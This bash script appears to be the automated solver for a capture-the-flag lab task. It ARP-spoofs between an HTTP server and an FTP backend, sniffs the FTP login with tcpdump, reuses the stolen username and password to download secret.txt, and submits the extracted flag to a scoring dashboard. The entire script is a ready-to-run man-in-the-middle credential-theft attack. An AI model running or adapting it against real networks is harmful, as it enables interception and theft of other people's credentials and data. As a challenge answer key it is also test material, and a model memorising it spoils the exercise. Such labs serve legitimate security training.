#!/bin/bash
set -euo pipefail

CHALLENGE_ID="challenge-come-this-way"
TASK_ID="task1"
HTTP_HOST="172.20.0.71"
FTP_HOST="172.20.0.72"
SUBMISSION_URL="http://172.20.0.3/api/challenges/submit"
NET_IFACE="${NET_IFACE:-eth0}"

TMP_DIR="$(mktemp -d)"
TCPDUMP_LOG="${TMP_DIR}/tcpdump.log"
SECRET_FILE="${TMP_DIR}/secret.txt"

cleanup() {
  for pid_var in ARPSPOOF_A_PID TCPDUMP_PID; do
    local pid="${!pid_var:-}"
    if [[ -n "${pid}" ]] && kill -0 "${pid}" 2>/dev/null; then
      kill "${pid}" 2>/dev/null || true
      wait "${pid}" 2>/dev/null || true
    fi
  done
  rm -rf "${TMP_DIR}"
}
trap cleanup EXIT

ensure_pkg() {
  local bin="$1"
  local pkg="$2"
  if ! command -v "${bin}" >/dev/null 2>&1; then
    if [[ -z "${APT_UPDATED:-}" ]]; then
      export DEBIAN_FRONTEND=noninteractive
      apt-get update
      APT_UPDATED=1
    fi
    apt-get install -y "${pkg}"
  fi
}


echo "[*] Installing dsniff if not installed"
ensure_pkg arpspoof dsniff

echo "[*] Starting tcpdump listener on ${NET_IFACE} for FTP traffic..."
tcpdump -n -l -A -i "${NET_IFACE}" port 21 > "${TCPDUMP_LOG}" 2>&1 &
TCPDUMP_PID=$!
sleep 1

echo "[*] Launching ARP spoofing between ${HTTP_HOST} and ${FTP_HOST}..."
arpspoof -i "${NET_IFACE}" -t "${HTTP_HOST}" "${FTP_HOST}" > /dev/null 2>&1 &
ARPSPOOF_A_PID=$!
sleep 2

DEADLINE=$((SECONDS + 90))
FTP_USER=""
FTP_PASS=""

echo "[*] Triggering HTTP requests to force backend FTP fetch..."
while (( SECONDS < DEADLINE )); do
  curl -sS --max-time 5 "http://${HTTP_HOST}" >/dev/null || true
  if [[ -z "${FTP_USER}" ]] && grep -q "FTP: USER " "${TCPDUMP_LOG}" 2>/dev/null; then
    FTP_USER="$(grep -o 'USER [^[:space:]]*' "${TCPDUMP_LOG}" | awk '{print $2}' | tr -d '\r' | tail -n1)"
  fi
  if [[ -z "${FTP_PASS}" ]] && grep -q "FTP: PASS " "${TCPDUMP_LOG}" 2>/dev/null; then
    FTP_PASS="$(grep -o 'PASS [^[:space:]]*' "${TCPDUMP_LOG}" | awk '{print $2}' | tr -d '\r' | tail -n1)"
  fi
  if [[ -n "${FTP_USER}" && -n "${FTP_PASS}" ]]; then
    break
  fi
  sleep 1
done

if [[ -z "${FTP_USER}" || -z "${FTP_PASS}" ]]; then
  echo "[!] Failed to capture FTP credentials via MITM."
  exit 1
fi

echo "[+] Captured FTP credentials: ${FTP_USER}/********"

echo "[*] Fetching secret.txt from FTP backend..."
curl -sS --fail --user "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/files/secret.txt" -o "${SECRET_FILE}"

if [[ ! -s "${SECRET_FILE}" ]]; then
  echo "[!] secret.txt was not downloaded properly."
  exit 1
fi

FLAG="$(grep -ao 'BSY{[^}]*}' "${SECRET_FILE}" | head -n1 || true)"
if [[ -z "${FLAG}" ]]; then
  echo "[!] No flag found in secret.txt"
  exit 1
fi

echo "[+] Retrieved flag: ${FLAG}"

payload=$(printf '{"challenge_id":"%s","task_id":"%s","flag":"%s"}' "${CHALLENGE_ID}" "${TASK_ID}" "${FLAG}")
echo "[*] Submitting flag to dashboard..."
response=$(curl -sS "${SUBMISSION_URL}" \
  -X POST \
  -H 'Content-Type: application/json' \
  --data-raw "${payload}")

if [[ "${response}" != *"Congratulations"* ]]; then
  echo "[!] Flag submission failed: ${response}"
  exit 1
fi

echo "[✓] Flag submitted successfully."
